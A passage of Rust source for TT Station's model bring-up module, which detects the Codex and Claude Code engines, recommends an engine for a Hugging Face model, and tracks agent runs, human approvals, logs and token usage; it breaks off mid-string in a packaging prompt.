// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 Tenstorrent USA, Inc.

//! Bring-up, beyond Orchard: the engines that can bring a model up on this
//! box, a quick look at a model to recommend one, and the Codex engine --
//! tt-metal's fast-models-fast pipeline (`.agents/scripts/multigoal`, eleven
//! Codex goals from a functional decoder to a vLLM release).
//!
//! TT Station runs the real runner, unchanged, through a small driver
//! (`codex_bringup.py`) whose only difference is that Codex's approval
//! requests come here instead of being accepted automatically: routine work
//! is approved on the box (policy `smart`), anything risky waits for a person
//! in the app or on the phone. The run holds all four chips under one gozer
//! lease (`gozer run --chips 4 --fresh`), so serving, Lab and Orchard can't
//! collide with it. Progress comes from the runner's own `manifest.txt` and
//! Codex's per-stage event log.
//!
//! - `GET /bringup/engines`: Orchard, Codex, Claude Code: installed, signed in, ready.
//! - `POST /bringup/survey {model}`: architecture, size, and the recommended engine.
//! - `GET|POST /bringup/codex/runs`; `GET /bringup/codex/runs/{id}`;
//!   `POST /bringup/codex/runs/{id}/{stop|resume}`.
//! - `POST /bringup/codex/runs/{id}/approvals/{aid} {decision}`: answer one.
//! - Driver-only (`X-Run-Secret`): `POST …/approvals`, `POST …/approvals/{aid}/wait`.
//!
//! Starting, stopping, resuming and deleting runs, and signing Claude Code in,
//! are an owner's (`routes::OwnerAuth`): the engines run commands on the box as
//! its own account, outside any sandbox.

use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::Mutex;
use std::time::Duration;

use axum::extract::{Path as UrlPath, State};
use axum::http::{HeaderMap, StatusCode};
use axum::Json;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};

use crate::notify::Draft;
use crate::routes::{AppState, BearerAuth, Phase};

const DRIVER: &str = include_str!("codex_bringup.py");
const CLAUDE_DRIVER: &str = include_str!("claude_bringup.py");
const PERMISSION_MCP: &str = include_str!("permission_mcp.py");
const LEASE_RUN: &str = include_str!("lease_run.py");
/// One start at a time (a double click must not start two runs).
static STARTING: std::sync::atomic::AtomicBool = std::sync::atomic::AtomicBool::new(false);
/// Runs being paused and relaunched (resume, "make the chips available"): the
/// unit is briefly down while the chips reset, which the watcher mustn't take
/// for the run ending.
static RESTARTING: Mutex<Vec<String>> = Mutex::new(Vec::new());

struct Restarting(String);
impl Restarting {
    fn new(id: &str) -> Self {
        RESTARTING.lock().expect("restarting").push(id.to_string());
        Self(id.to_string())
    }
}
impl Drop for Restarting {
    fn drop(&mut self) {
        RESTARTING
            .lock()
            .expect("restarting")
            .retain(|r| r != &self.0);
    }
}
/// The finish line's stage number (after fast-models-fast's eleven).
pub const PACKAGE_STAGE: usize = 12;
const PROMPTS: &str = ".agents/prompts/model_bringup_multigoal";

type Reply<T = Json<Value>> = Result<T, (StatusCode, Json<Value>)>;

fn err(status: StatusCode, msg: impl Into<String>) -> (StatusCode, Json<Value>) {
    (status, Json(json!({ "error": msg.into() })))
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

fn home() -> PathBuf {
    std::env::var_os("HOME")
        .map(PathBuf::from)
        .unwrap_or_default()
}

fn which(name: &str) -> Option<String> {
    let mut dirs: Vec<PathBuf> =
        std::env::split_paths(&std::env::var("PATH").unwrap_or_default()).collect();
    dirs.extend(["/usr/local/bin", "/usr/bin"].map(PathBuf::from));
    dirs.push(home().join(".local/bin"));
    dirs.into_iter()
        .map(|d| d.join(name))
        .find(|p| p.is_file())
        .map(|p| p.display().to_string())
}

// ---------------------------------------------------------------------
// The Codex environment
// ---------------------------------------------------------------------

/// tt-metal with the fast-models-fast agents, its Python, and Codex.
#[derive(Debug, Clone)]
pub struct CodexEnv {
    pub repo: PathBuf,
    pub python: PathBuf,
    pub codex: Option<String>,
}

impl CodexEnv {
    pub fn detect() -> CodexEnv {
        let repo = std::env::var_os("TT_METAL_HOME")
            .map(PathBuf::from)
            .unwrap_or_else(|| home().join("tt-metal"));
        CodexEnv {
            python: repo.join("python_env/bin/python"),
            repo,
            codex: std::env::var("CODEX_BIN").ok().or_else(|| which("codex")),
        }
    }

    pub fn runner_ok(&self) -> bool {
        self.repo.join(".agents/scripts/multigoal").is_file() && self.repo.join(PROMPTS).is_dir()
    }

    /// The stage prompts, in order (`01-functional-decoder.txt` …).
    pub fn prompts(&self) -> Vec<PathBuf> {
        let mut out: Vec<PathBuf> = std::fs::read_dir(self.repo.join(PROMPTS))
            .map(|it| {
                it.flatten()
                    .map(|e| e.path())
                    .filter(|p| p.extension().and_then(|x| x.to_str()) == Some("txt"))
                    .collect()
            })
            .unwrap_or_default();
        out.sort();
        out
    }

    fn branch(&self) -> Option<String> {
        let out = Command::new("git")
            .args(["-C"])
            .arg(&self.repo)
            .args(["rev-parse", "--abbrev-ref", "HEAD"])
            .output()
            .ok()?;
        out.status
            .success()
            .then(|| String::from_utf8_lossy(&out.stdout).trim().to_string())
    }

    fn signed_in(&self) -> bool {
        let Some(codex) = &self.codex else {
            return false;
        };
        Command::new(codex)
            .args(["login", "status"])
            .stdin(Stdio::null())
            .output()
            .map(|o| {
                let text = format!(
                    "{}{}",
                    String::from_utf8_lossy(&o.stdout),
                    String::from_utf8_lossy(&o.stderr)
                );
                o.status.success() && text.contains("Logged in")
            })
            .unwrap_or(false)
    }
}

/// Claude Code: installed, and signed in (`claude auth status`).
pub fn claude_bin() -> Option<String> {
    which("claude").or_else(|| {
        let p = home().join(".local/share/node/current/bin/claude");
        p.is_file().then(|| p.display().to_string())
    })
}

pub fn claude_signed_in(bin: &str) -> bool {
    Command::new(bin)
        .args(["auth", "status"])
        .stdin(Stdio::null())
        .output()
        .ok()
        .and_then(|o| serde_json::from_slice::<Value>(&o.stdout).ok())
        .is_some_and(|v| v["loggedIn"] == true)
}

/// "01-functional-decoder.txt" → "Functional decoder".
pub fn stage_title(path: &Path) -> String {
    let stem = path.file_stem().and_then(|s| s.to_str()).unwrap_or("");
    let words = stem
        .split_once('-')
        .map(|(_, rest)| rest)
        .unwrap_or(stem)
        .replace('-', " ");
    let words = words.replace("vllm", "vLLM").replace("tti", "TTI");
    let mut c = words.chars();
    let title = c
        .next()
        .map(|f| f.to_uppercase().collect::<String>() + c.as_str())
        .unwrap_or_default();
    title.replacen("VLLM", "vLLM", 1)
}

/// fast-models-fast's MODEL_DIR: the HF id, lowercased, non-alphanumerics → `_`.
pub fn model_dir(model: &str) -> String {
    let safe: String = model
        .to_lowercase()
        .chars()
        .map(|c| if c.is_ascii_alphanumeric() { c } else { '_' })
        .collect();
    format!("models/autoports/{safe}")
}

// ---------------------------------------------------------------------
// Engines and the survey
// ---------------------------------------------------------------------

/// `GET /bringup/engines` (authed).
pub(crate) async fn get_engines(State(state): State<AppState>, _auth: BearerAuth) -> Json<Value> {
    let orchard = state.orchard().map(|o| o.installed()).unwrap_or(false);
    let env = CodexEnv::detect();
    let codex = tokio::task::spawn_blocking(move || {
        let signed_in = env.signed_in();
        json!({
            "installed": env.codex.is_some(),
            "signed_in": signed_in,
            "repo": env.repo.display().to_string(),
            "runner": env.runner_ok(),
            "python": env.python.is_file(),
            "branch": env.branch(),
            "stages": env.prompts().iter().map(|p| stage_title(p)).collect::<Vec<_>>(),
            "gozer": which("gozer").is_some(),
        })
    })
    .await
    .unwrap_or_default();
    let ready = codex["installed"] == true
        && codex["signed_in"] == true
        && codex["runner"] == true
        && codex["python"] == true;
    let why_not = if codex["installed"] != true {
        Some("Codex isn't installed.")
    } else if codex["signed_in"] != true {
        Some("Codex isn't signed in. Run `codex login` once.")
    } else if codex["runner"] != true {
        Some("tt-metal's fast-models-fast agents aren't checked out (~/tt-metal, branch agentic-research/fast-models-fast).")
    } else if codex["python"] != true {
        Some("tt-metal's python_env isn't built.")
    } else {
        None
    };
    let runner_ok = codex["runner"] == true && codex["python"] == true;
    let claude = tokio::task::spawn_blocking(move || {
        let bin = claude_bin();
        let signed_in = bin.as_deref().is_some_and(claude_signed_in);
        let why_not = if bin.is_none() {
            Some("Claude Code isn't installed.")
        } else if !signed_in {
            Some("Claude Code isn't signed in yet.")
        } else if !runner_ok {
            Some("tt-metal's fast-models-fast stages aren't checked out (~/tt-metal).")
        } else {
            None
        };
        json!({ "installed": bin.is_some(), "signed_in": signed_in, "ready": why_not.is_none(), "why_not": why_not })
    })
    .await
    .unwrap_or_default();
    Json(json!({
        "engines": [
            { "id": "orchard", "name": "Orchard", "ready": orchard, "why_not": (!orchard).then_some("tt-orchard isn't set up (Bring-up → Set up Orchard)."),
              "blurb": "Local agents on this box. No account. Grafts new weights onto an architecture TT-Metal already runs.",
              "estimate": "About 3 hours", "account": null },
            { "id": "codex", "name": "Codex", "ready": ready, "why_not": why_not, "detail": codex,
              "blurb": "fast-models-fast: a full port, from a functional decoder to a vLLM release, in eleven checked stages.",
              "estimate": "Several hours", "account": "ChatGPT" },
            { "id": "claude", "name": "Claude Code", "ready": claude["ready"], "installed": claude["installed"], "signed_in": claude["signed_in"],
              "why_not": claude["why_not"],
              "blurb": "The same eleven stages, skills and checks, driven by Claude.", "estimate": "Several hours", "account": "Anthropic" },
        ]
    }))
}

#[derive(Debug, Deserialize)]
pub struct SurveyBody {
    pub model: String,
}

pub(crate) fn hf_token() -> Option<String> {
    std::env::var("HF_TOKEN")
        .ok()
        .filter(|t| !t.is_empty())
        .or_else(|| {
            std::fs::read_to_string(home().join(".cache/huggingface/token"))
                .ok()
                .map(|t| t.trim().to_string())
        })
}

async fn hf_model(model: &str) -> Result<Value, String> {
    let mut req = reqwest::Client::new()
        .get(format!("https://huggingface.co/api/models/{model}"))
        .timeout(Duration::from_secs(15));
    if let Some(t) = hf_token() {
        req = req.bearer_auth(t);
    }
    let res = req
        .send()
        .await
        .map_err(|e| format!("couldn't reach Hugging Face: {e}"))?;
    match res.status().as_u16() {
        200 => res.json().await.map_err(|e| e.to_string()),
        401 | 403 => Err("That model is gated: accept its license on Hugging Face (with the account whose token is on this box).".into()),
        404 => Err("There's no model with that name on Hugging Face.".into()),
        s => Err(format!("Hugging Face answered {s}")),
    }
}

fn arch_cache_path(state: &AppState) -> PathBuf {
    state.config_dir().join("bringup/architectures.json")
}

/// Architectures the box's tt catalog already runs: {architecture: [catalog names]}.
async fn known_architectures(state: &AppState) -> HashMap<String, Vec<String>> {
    let probe = state.clone();
    let catalog: Vec<(String, Option<String>)> = tokio::task::spawn_blocking(move || {
        probe
            .tt_cli()
            .and_then(|tt| tt.catalog(probe.device_mesh(), false).ok())
            .map(|c| {
                c.models
                    .into_iter()
                    .filter(|m| m.supported)
                    .map(|m| (m.name, m.hf_repo))
                    .collect()
            })
            .unwrap_or_default()
    })
    .await
    .unwrap_or_default();
    // repo → architecture, cached (it never changes for a repo).
    let path = arch_cache_path(state);
    let mut cache: HashMap<String, String> = std::fs::read(&path)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default();
    let mut changed = false;
    for (_, repo) in &catalog {
        let Some(repo) = repo else { continue };
        if cache.contains_key(repo) {
            continue;
        }
        if let Ok(v) = hf_model(repo).await {
            if let Some(a) = v["config"]["architectures"][0].as_str() {
                cache.insert(repo.clone(), a.to_string());
                changed = true;
            }
        }
    }
    if changed {
        let _ = std::fs::create_dir_all(path.parent().unwrap_or(Path::new(".")));
        let _ = std::fs::write(&path, serde_json::to_vec_pretty(&cache).unwrap_or_default());
    }
    let mut out: HashMap<String, Vec<String>> = HashMap::new();
    for (name, repo) in catalog {
        if let Some(a) = repo.and_then(|r| cache.get(&r).cloned()) {
            out.entry(a).or_default().push(name);
        }
    }
    out
}

/// `POST /bringup/survey` (authed).
pub(crate) async fn post_survey(
    State(state): State<AppState>,
    _auth: BearerAuth,
    Json(body): Json<SurveyBody>,
) -> Reply {
    let model = body
        .model
        .trim()
        .trim_start_matches("https://huggingface.co/")
        .trim_end_matches('/')
        .to_string();
    if !crate::orchard::valid_model(&model) {
        return Err(err(
            StatusCode::BAD_REQUEST,
            "Use a Hugging Face id like org/model-name.",
        ));
    }
    let info = hf_model(&model)
        .await
        .map_err(|e| err(StatusCode::BAD_GATEWAY, e))?;
    let arch = info["config"]["architectures"][0]
        .as_str()
        .map(str::to_string);
    let known = known_architectures(&state).await;
    let siblings = arch
        .as_ref()
        .and_then(|a| known.get(a))
        .cloned()
        .unwrap_or_default();
    let already = {
        let probe = state.clone();
        let m = model.clone();
        tokio::task::spawn_blocking(move || {
            probe
                .tt_cli()
                .and_then(|tt| tt.catalog(probe.device_mesh(), false).ok())
                .and_then(|c| c.find(&m).map(|x| x.name.clone()))
        })
        .await
        .ok()
        .flatten()
    };
    let params = info["safetensors"]["total"].as_f64().map(|p| p / 1e9);
    let package = crate::community::package_for(&model);
    let (recommend, why) = if let Some(name) = &already {
        (
            "none",
            format!("{name} already runs on this box: download it in Models."),
        )
    } else if let Some(p) = &package {
        ("community", format!("Someone has already packaged it to run on Tenstorrent chips ({p}). Download it from the community catalog and start it: no bring-up needed."))
    } else if !siblings.is_empty() {
        ("orchard", format!(
            "{} already runs on this box ({}), so only the weights are new. Orchard can graft them onto the existing implementation, locally.",
            arch.clone().unwrap_or_default(),
            siblings.join(", ")
        ))
    } else {
        ("codex", format!(
            "{} isn't an architecture this box runs yet, so it needs a full port: new model code, tested stage by stage.",
            arch.clone().unwrap_or_else(|| "This architecture".into())
        ))
    };
    Ok(Json(json!({
        "model": model,
        "architecture": arch,
        "model_type": info["config"]["model_type"],
        "params_b": params,
        "gated": info["gated"],
        "license": info["cardData"]["license"],
        "pipeline": info["pipeline_tag"],
        "same_architecture": siblings,
        "already_in_catalog": already,
        "community_package": package,
        "recommend": recommend,
        "why": why,
        "model_dir": model_dir(&model),
    })))
}

// ---------------------------------------------------------------------
// Codex runs
// ---------------------------------------------------------------------

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CodexRun {
    pub id: String,
    /// codex | claude
    #[serde(default = "codex_engine")]
    pub engine: String,
    pub model: String,
    pub model_dir: String,
    pub log_dir: PathBuf,
    pub unit: String,
    pub policy: String,
    pub started: u64,
    pub secret: String,
    #[serde(default)]
    pub restore: Option<String>,
    #[serde(default)]
    pub finished: Option<u64>,
    #[serde(default)]
    pub exit: Option<i32>,
    #[serde(default)]
    pub stopped: bool,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Approval {
    pub id: String,
    pub kind: String,
    pub why: String,
    pub command: Option<String>,
    pub cwd: Option<String>,
    pub reason: Option<String>,
    pub grant_root: Option<String>,
    pub created: u64,
    pub decision: Option<String>,
}

static APPROVALS: Mutex<Vec<(String, Approval)>> = Mutex::new(Vec::new());
static DECIDED: std::sync::LazyLock<tokio::sync::Notify> =
    std::sync::LazyLock::new(tokio::sync::Notify::new);
/// Where unanswered approvals are kept, so an agent restart doesn't lose (and
/// so deny) a question a run is waiting on. Set when the watcher starts.
static APPROVALS_FILE: std::sync::OnceLock<PathBuf> = std::sync::OnceLock::new();

/// Approvals changed: wake the drivers waiting on a decision, and save the
/// unanswered ones.
fn approvals_changed() {
    DECIDED.notify_waiters();
    if let Some(path) = APPROVALS_FILE.get() {
        let open: Vec<(String, Approval)> = APPROVALS
            .lock()
            .expect("approvals")
            .iter()
            .filter(|(_, a)| a.decision.is_none())
            .cloned()
            .collect();
        let _ = std::fs::write(path, serde_json::to_vec(&open).unwrap_or_default());
    }
}

/// At startup: bring back the unanswered approvals of runs that are still going.
fn restore_approvals(state: &AppState, live: &[String]) {
    load_approvals(state.config_dir().join("bringup/approvals.json"), live);
}

fn load_approvals(path: PathBuf, live: &[String]) {
    let saved: Vec<(String, Approval)> = std::fs::read(&path)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default();
    {
        let mut all = APPROVALS.lock().expect("approvals");
        for (run, a) in saved.into_iter().filter(|(run, _)| live.contains(run)) {
            if !all.iter().any(|(_, b)| b.id == a.id) {
                all.push((run, a));
            }
        }
    }
    let _ = APPROVALS_FILE.set(path);
    approvals_changed();
}

fn codex_engine() -> String {
    "codex".into()
}

fn runs_path(state: &AppState) -> PathBuf {
    state.config_dir().join("bringup/codex-runs.json")
}

fn load_runs(state: &AppState) -> Vec<CodexRun> {
    crate::fsio::read_json_or_backup(&runs_path(state)).unwrap_or_default()
}

fn save_runs(state: &AppState, runs: &[CodexRun]) {
    crate::fsio::save_json(&runs_path(state), runs, crate::fsio::PRIVATE);
}

fn unit_active(unit: &str) -> bool {
    Command::new("systemctl")
        .args(["--user", "is-active", "--quiet", unit])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

fn read_manifest(dir: &Path) -> HashMap<String, String> {
    parse_manifest(&std::fs::read_to_string(dir.join("manifest.txt")).unwrap_or_default())
}

/// A run's manifest, later lines winning. fast-models-fast records a resumed
/// stage's outcome as `stage_N_resume_K_terminal_status` / `_check`; those are
/// folded into `stage_N_…` so a resumed stage reads like any other.
fn parse_manifest(text: &str) -> HashMap<String, String> {
    let mut out = HashMap::new();
    for (k, v) in text
        .lines()
        .filter(|l| !l.starts_with("- "))
        .filter_map(|l| l.split_once('='))
    {
        out.insert(k.to_string(), v.to_string());
        let resumed = k.strip_prefix("stage_").and_then(|rest| {
            let (n, rest) = rest.split_once("_resume_")?;
            let (attempt, field) = rest.split_once('_')?;
            (n.parse::<usize>().is_ok()
                && attempt.parse::<usize>().is_ok()
                && matches!(field, "terminal_status" | "check" | "started_at_utc"))
            .then(|| {
                (
                    format!("stage_{n}_terminal_status"),
                    format!("stage_{n}_check"),
                    field,
                )
            })
        });
        match resumed {
            // Resumed: running again, so the old outcome and check no longer apply.
            Some((status, check, "started_at_utc")) => {
                out.insert(status, String::new());
                out.remove(&check);
            }
            Some((status, _, "terminal_status")) => {
                out.insert(status, v.to_string());
            }
            Some((_, check, _)) => {
                out.insert(check, v.to_string());
            }
            None => {}
        }
    }
    out
}

/// A stage's logs, oldest first: the stage itself, then any resumes and fix-ups
/// (`NN-name.resume-K.jsonl`, `NN-name.remediation-K.jsonl`).
fn stage_logs(dir: &Path, name: &str) -> Vec<PathBuf> {
    let mut logs: Vec<(std::time::SystemTime, PathBuf)> = std::fs::read_dir(dir)
        .into_iter()
        .flatten()
        .flatten()
        .filter_map(|e| {
            let f = e.file_name().to_string_lossy().to_string();
            let ours = f == format!("{name}.jsonl")
                || (f.starts_with(&format!("{name}.")) && f.ends_with(".jsonl"));
            ours.then(|| {
                (
                    e.metadata()
                        .and_then(|m| m.modified())
                        .unwrap_or(std::time::UNIX_EPOCH),
                    e.path(),
                )
            })
        })
        .collect();
    logs.sort();
    logs.into_iter().map(|(_, p)| p).collect()
}

/// The last `bytes` of a file, whole lines only.
fn tail_text(path: &Path, bytes: u64) -> String {
    use std::io::{Read, Seek, SeekFrom};
    let Ok(mut f) = std::fs::File::open(path) else {
        return String::new();
    };
    let len = f.metadata().map(|m| m.len()).unwrap_or(0);
    let start = len.saturating_sub(bytes);
    let _ = f.seek(SeekFrom::Start(start));
    let mut buf = Vec::new();
    let _ = f.read_to_end(&mut buf);
    let text = String::from_utf8_lossy(&buf).to_string();
    if start > 0 {
        text.split_once('\n')
            .map(|(_, rest)| rest.to_string())
            .unwrap_or_default()
    } else {
        text
    }
}

fn clip(s: &str, n: usize) -> String {
    let s = s.trim();
    if s.chars().count() <= n {
        s.to_string()
    } else {
        format!("{}…", s.chars().take(n).collect::<String>())
    }
}

/// What Codex did lately, from a stage's app-server log: commands (with
/// exit codes), files changed, what it said, and goal changes.
pub fn events_from_log(text: &str, keep: usize) -> Vec<Value> {
    let mut out = Vec::new();
    // Claude's tool calls by id, to attach their results when they arrive.
    let mut calls: HashMap<String, usize> = HashMap::new();
    for line in text.lines() {
        let Ok(v) = serde_json::from_str::<Value>(line) else {
            continue;
        };
        if v["direction"] != "recv" {
            continue;
        }
        if v.get("claude").is_some() {
            claude_events(
                &v["claude"],
                v["ts"].as_str().unwrap_or(""),
                &mut out,
                &mut calls,
            );
            continue;
        }
        let m = &v["message"];
        let at = v["ts"].as_str().unwrap_or("");
        match m["method"].as_str() {
            Some("item/completed") => {
                let item = &m["params"]["item"];
                match item["type"].as_str() {
                    Some("commandExecution") => out.push(json!({
                        "at": at, "kind": "command",
                        "text": clip(item["command"].as_str().unwrap_or(""), 240),
                        "exit": item["exitCode"], "ms": item["durationMs"],
                        "output": item["aggregatedOutput"].as_str().map(|o| clip_tail(o, OUTPUT_KEEP)),
                    })),
                    Some("fileChange") => {
                        let files: Vec<String> = item["changes"]
                            .as_array()
                            .map(|c| c.iter().filter_map(|x| x["path"].as_str().map(|p| p.rsplit('/').next().unwrap_or(p).to_string())).collect())
                            .unwrap_or_default();
                        out.push(json!({ "at": at, "kind": "edit", "text": format!("edited {}", files.join(", ")) }));
                    }
                    Some("agentMessage") => {
                        let t = item["text"].as_str().unwrap_or("");
                        if !t.trim().is_empty() {
                            out.push(json!({ "at": at, "kind": "says", "text": clip(t, 600) }));
                        }
                    }
                    Some("webSearch") => out.push(json!({ "at": at, "kind": "search", "text": clip(item["query"].as_str().unwrap_or(""), 200) })),
                    _ => {}
                }
            }
            Some("thread/goal/updated") => {
                let status = m["params"]["goal"]["status"].as_str().unwrap_or("");
                out.push(json!({ "at": at, "kind": "goal", "text": format!("goal {status}") }));
            }
            Some("turn/completed") => {
                if let Some(e) = m["params"]["turn"]["error"]["message"].as_str() {
                    out.push(json!({ "at": at, "kind": "error", "text": clip(e, 300) }));
                }
            }
            _ => {}
        }
    }
    let skip = out.len().saturating_sub(keep);
    out.into_iter().skip(skip).collect()
}

/// How much of a command's output an event keeps (its end, where errors are).
const OUTPUT_KEEP: usize = 2000;

fn clip_tail(s: &str, n: usize) -> String {
    let s = s.trim_end();
    let count = s.chars().count();
    if count <= n {
        s.to_string()
    } else {
        format!("…{}", s.chars().skip(count - n).collect::<String>())
    }
}

/// `20261008T151704Z` (the runners' timestamps) → Unix seconds.
fn ts_unix(ts: &str) -> Option<u64> {
    let (date, time) = ts.strip_suffix('Z')?.split_once('T')?;
    let num = |s: &str| s.parse::<i64>().ok();
    let (y, m, d) = (
        num(date.get(0..4)?)?,
        num(date.get(4..6)?)?,
        num(date.get(6..8)?)?,
    );
    let (hh, mm, ss) = (
        num(time.get(0..2)?)?,
        num(time.get(2..4)?)?,
        num(time.get(4..6)?)?,
    );
    // Days from the civil date (Howard Hinnant's algorithm).
    let y = if m <= 2 { y - 1 } else { y };
    let era = y.div_euclid(400);
    let yoe = y - era * 400;
    let doy = (153 * (if m > 2 { m - 3 } else { m + 9 }) + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    let days = era * 146_097 + doe - 719_468;
    u64::try_from(days * 86_400 + hh * 3600 + mm * 60 + ss).ok()
}

/// What a stage's agent has used so far, read from its logs.
#[derive(Debug, Clone, Default)]
struct Usage {
    /// Bytes of the log already counted.
    offset: u64,
    first: Option<u64>,
    last: Option<u64>,
    /// Claude: tokens sent and generated, and what its turns cost (API prices).
    tokens_in: u64,
    tokens_out: u64,
    cost: f64,
    last_message: String,
    /// That message's usage as last counted (in, out); a later copy replaces it.
    last_counted: (u64, u64),
    /// Codex: each thread's running totals (in, out); a resumed thread carries on.
    threads: HashMap<String, (u64, u64)>,
}

impl Usage {
    fn add_line(&mut self, v: &Value) {
        if let Some(t) = v["ts"].as_str().and_then(ts_unix) {
            self.first.get_or_insert(t);
            self.last = Some(t);
        }
        let c = &v["claude"];
        if c["type"] == "assistant" {
            // One API message arrives as several lines (one per block), each with its
            // usage so far: count each message once, at its latest figures.
            let id = c["message"]["id"].as_str().unwrap_or("").to_string();
            let u = &c["message"]["usage"];
            let n = |k: &str| u[k].as_u64().unwrap_or(0);
            let now = (
                n("input_tokens") + n("cache_creation_input_tokens") + n("cache_read_input_tokens"),
                n("output_tokens"),
            );
            if id == self.last_message {
                self.tokens_in -= self.last_counted.0;
                self.tokens_out -= self.last_counted.1;
            }
            self.tokens_in += now.0;
            self.tokens_out += now.1;
            self.last_message = id;
            self.last_counted = now;
        } else if c["type"] == "result" {
            self.cost += c["total_cost_usd"].as_f64().unwrap_or(0.0);
        }
        let m = &v["message"];
        if m["method"] == "thread/tokenUsage/updated" {
            let p = &m["params"];
            let total = &p["tokenUsage"]["total"];
            let thread = p["threadId"].as_str().unwrap_or("").to_string();
            self.threads.insert(
                thread,
                (
                    total["inputTokens"].as_u64().unwrap_or(0),
                    total["outputTokens"].as_u64().unwrap_or(0),
                ),
            );
        }
    }
}

static USAGE: std::sync::LazyLock<Mutex<HashMap<PathBuf, Usage>>> =
    std::sync::LazyLock::new(|| Mutex::new(HashMap::new()));

/// A stage's usage and timing across its logs, read incrementally.
fn stage_usage(logs: &[PathBuf]) -> Option<Value> {
    use std::io::{BufRead, Seek, SeekFrom};
    if logs.is_empty() {
        return None;
    }
    let mut cache = USAGE.lock().expect("usage");
    let mut total = Usage::default();
    for path in logs {
        let len = std::fs::metadata(path).map(|m| m.len()).unwrap_or(0);
        let u = cache.entry(path.clone()).or_default();
        if len < u.offset {
            *u = Usage::default(); // rewritten
        }
        if len > u.offset {
            if let Ok(mut f) = std::fs::File::open(path) {
                let _ = f.seek(SeekFrom::Start(u.offset));
                let mut reader = std::io::BufReader::new(f);
                let mut line = String::new();
                while reader.read_line(&mut line).unwrap_or(0) > 0 {
                    if !line.ends_with('\n') {
                        break; // half-written: count it next time
                    }
                    u.offset += line.len() as u64;
                    if let Ok(v) = serde_json::from_str::<Value>(&line) {
                        u.add_line(&v);
                    }
                    line.clear();
                }
            }
        }
        total.first = match (total.first, u.first) {
            (Some(a), Some(b)) => Some(a.min(b)),
            (a, b) => a.or(b),
        };
        total.last = total.last.max(u.last);
        total.tokens_in += u.tokens_in;
        total.tokens_out += u.tokens_out;
        total.cost += u.cost;
        for (t, (i, o)) in &u.threads {
            let e = total.threads.entry(t.clone()).or_default();
            *e = (e.0.max(*i), e.1.max(*o));
        }
    }
    let (cin, cout) = total
        .threads
        .values()
        .fold((0, 0), |(a, b), (i, o)| (a + i, b + o));
    Some(json!({
        "started_at": total.first, "last_at": total.last,
        "tokens_in": total.tokens_in + cin, "tokens_out": total.tokens_out + cout,
        "cost_usd": (total.cost > 0.0).then_some((total.cost * 100.0).round() / 100.0),
    }))
}

/// One line of Claude Code's `stream-json` → events.
fn claude_events(c: &Value, at: &str, out: &mut Vec<Value>, calls: &mut HashMap<String, usize>) {
    match c["type"].as_str() {
        Some("assistant") => {
            for item in c["message"]["content"].as_array().into_iter().flatten() {
                match item["type"].as_str() {
                    Some("text") => {
                        let t = item["text"].as_str().unwrap_or("");
                        if !t.trim().is_empty() {
                            out.push(json!({ "at": at, "kind": "says", "text": clip(t, 600) }));
                        }
                    }
                    Some("tool_use") => {
                        let input = &item["input"];
                        let name = item["name"].as_str().unwrap_or("a tool");
                        let ev = match name {
                            "Bash" => json!({ "at": at, "kind": "command", "text": clip(input["command"].as_str().unwrap_or(""), 240), "exit": null }),
                            "Edit" | "Write" | "MultiEdit" | "NotebookEdit" => {
                                let p = input["file_path"].as_str().or(input["notebook_path"].as_str()).unwrap_or("");
                                json!({ "at": at, "kind": "edit", "text": format!("edited {}", p.rsplit('/').next().unwrap_or(p)) })
                            }
                            "WebSearch" => json!({ "at": at, "kind": "search", "text": clip(input["query"].as_str().unwrap_or(""), 200) }),
                            "Skill" => json!({ "at": at, "kind": "goal", "text": format!("using the {} skill", input["skill"].as_str().or(input["name"].as_str()).unwrap_or("?")) }),
                            "Read" | "Glob" | "Grep" | "LS" | "TodoWrite" => continue,
                            other => json!({ "at": at, "kind": "goal", "text": format!("used {other}") }),
                        };
                        if let Some(id) = item["id"].as_str() {
                            calls.insert(id.to_string(), out.len());
                        }
                        out.push(ev);
                    }
                    _ => {}
                }
            }
        }
        Some("user") => {
            // A command's result: its exit code ("Exit code N" when it failed) and output.
            for item in c["message"]["content"].as_array().into_iter().flatten() {
                if item["type"] != "tool_result" {
                    continue;
                }
                let Some(&i) = item["tool_use_id"].as_str().and_then(|id| calls.get(id)) else { continue };
                if out[i]["kind"] != "command" {
                    continue;
                }
                let content = match &item["content"] {
                    Value::String(t) => t.clone(),
                    Value::Array(parts) => parts.iter().filter_map(|p| p["text"].as_str()).collect::<Vec<_>>().join("\n"),
                    _ => String::new(),
                };
                let failed = item["is_error"] == true;
                let exit = if failed {
                    content.strip_prefix("Exit code ").and_then(|r| r.split_whitespace().next()).and_then(|n| n.parse::<i64>().ok()).unwrap_or(1)
                } else {
                    0
                };
                let r = &c["tool_use_result"];
                let output = match (r["stdout"].as_str(), r["stderr"].as_str()) {
                    (Some(o), e) if !failed => format!("{o}{}", e.filter(|e| !e.is_empty()).map(|e| format!("\n{e}")).unwrap_or_default()),
                    _ => content,
                };
                out[i]["exit"] = json!(exit);
                out[i]["output"] = json!(clip_tail(&output, OUTPUT_KEEP));
            }
        }
        Some("result") => {
            let failed = c["is_error"] == true;
            out.push(json!({ "at": at, "kind": if failed { "error" } else { "goal" },
                "text": if failed { clip(c["result"].as_str().unwrap_or("the turn failed"), 300) } else { "turn finished".to_string() } }));
        }
        Some("error") => out.push(json!({ "at": at, "kind": "error", "text": clip(c["error"].as_str().unwrap_or("error"), 300) })),
        _ => {}
    }
}

/// The finish line's prompt: package the port with tt-model, prove it, stage it. Never publish.
fn package_prompt(env: &CodexEnv, run: &CodexRun, out: &Path) -> String {
    format!(
        "/goal Package the {model} port in {dir} (tt-metal at {repo}) as a tt-model CONTAINER (v5.1) package and prove it \
serves on this QuietBox 2 (p300x2: 2 p300c boards, 4 Blackhole chips). Use $tt-model-yaml to author {out}/tt-model.yaml for \
the port (hardware p300x2; take the serve command and flags from the port's vLLM stage evidence under {dir}/doc, and its \
